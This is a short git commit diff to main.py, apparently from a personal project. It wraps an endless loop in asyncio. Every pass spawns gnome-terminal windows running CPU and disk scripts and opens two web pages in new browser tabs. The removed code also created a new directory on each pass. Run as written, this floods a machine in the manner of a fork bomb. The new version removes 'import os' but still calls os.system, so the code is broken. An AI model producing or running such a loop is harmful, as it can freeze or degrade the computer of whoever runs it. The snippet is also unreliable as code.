3a1cbcf920916cc1178d25d395a597c92b4e1686
Manofox-br <agelo7439@gmail.com>
2026-08-08 14:22:08 -0300

    Atualizar o main.py

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-import os, subprocess, webbrowser
+import subprocess, webbrowser, asyncio
 
 commands = [
   "bash scripts/cpu.sh",
@@ -9,11 +9,12 @@ commands = [
 os.system(f"chmod +x scripts/cpu.sh")
 os.system(f"chmod +x scripts/disk.sh")
 
-i = 0
-while True:
-  for cmd in commands:
-    subprocess.Poppen(["gnome-terminal", "--", "bash", "-c", cmd])
-    webbrowser.open_new_tabs("https://www.growden.io")
-    webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
-    os.mkdir(str(i))
-  i += 1
+async def one():
+  i = 0
+  while True:
+    for cmd in commands:
+      subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
+      webbrowser.open_new_tab("https://www.growden.io")
+      webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
+      
+asyncio.run(one())
